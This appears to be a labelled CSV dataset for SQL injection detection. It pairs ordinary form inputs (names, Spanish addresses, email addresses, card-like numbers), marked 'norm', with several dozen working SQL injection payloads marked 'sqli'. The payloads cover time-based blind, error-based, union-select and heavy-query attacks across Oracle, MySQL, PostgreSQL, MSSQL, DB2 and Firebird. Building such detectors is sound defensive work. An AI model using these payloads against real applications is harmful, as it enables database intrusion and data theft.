"-3136%') or 3400=6002,""21"",""sqli"",""anom"""
"1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,""60"",""sqli"",""anom"""
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw,""227"",""sqli"",""anom"""
"-2604)) as sekb where 6897=6897 or 1000=7683,""44"",""sqli"",""anom"""
"1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,""51"",""sqli"",""anom"""
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""="",""134"",""sqli"",""anom"""
"-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,""203"",""sqli"",""anom"""
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--,""104"",""sqli"",""anom"""
"tweddle,""7"",""norm"",""norm"""
"sirevici,""8"",""norm"",""norm"""
"90230020p,""9"",""norm"",""norm"""
"6034871098442134,""16"",""norm"",""norm"""
"vingelli9@custombikesclothes.fr,""31"",""norm"",""norm"""
"fuentelmonge,""12"",""norm"",""norm"""
"m*ule38,""7"",""norm"",""norm"""
"cimorra,""7"",""norm"",""norm"""
"knippenberg@soyriojano.cf,""25"",""norm"",""norm"""
"iza,""3"",""norm"",""norm"""
"martinn sampayo,""15"",""norm"",""norm"""
"calle plantio, 178,,""19"",""norm"",""norm"""
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--,""115"",""sqli"",""anom"""
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666,""111"",""sqli"",""anom"""
"-3136%') or 3400=6002,""21"",""sqli"",""anom"""
"1) where 7956=7956 or sleep(5)#,""31"",""sqli"",""anom"""
"-7387'))) order by 1--,""22"",""sqli"",""anom"""
"1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,""60"",""sqli"",""anom"""
"1))) union all select null,null,null#,""37"",""sqli"",""anom"""
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--,""66"",""sqli"",""anom"""
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw,""227"",""sqli"",""anom"""
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#,""55"",""sqli"",""anom"""
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240,""101"",""sqli"",""anom"""
"-2604)) as sekb where 6897=6897 or 1000=7683,""44"",""sqli"",""anom"""
"1%""))) waitfor delay '0:0:5'--,""30"",""sqli"",""anom"""
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#,""56"",""sqli"",""anom"""
"1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,""51"",""sqli"",""anom"""
"1%"");select benchmark(5000000,md5(0x714e4153))#,""47"",""sqli"",""anom"""
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--,""103"",""sqli"",""anom"""
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""="",""134"",""sqli"",""anom"""
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--,""57"",""sqli"",""anom"""
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi,""124"",""sqli"",""anom"""
"-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,""203"",""sqli"",""anom"""
"flloko-humet@imarbella.ms,""25"",""norm"",""norm"""
"54925627v,""9"",""norm"",""norm"""
"c/ obispo alonso suarez, 163,,""29"",""norm"",""norm"""
"cervatos de la cueza,""20"",""norm"",""norm"""
"34347,""5"",""norm"",""norm"""
"6552399616832844,""16"",""norm"",""norm"""
"mathur,""6"",""norm"",""norm"""
"indis6r4cin,""11"",""norm"",""norm"""
"damacia,""7"",""norm"",""norm"""
"rost jorge,""10"",""norm"",""norm"""
"signoret@pisossantcugat.cat,""27"",""norm"",""norm"""
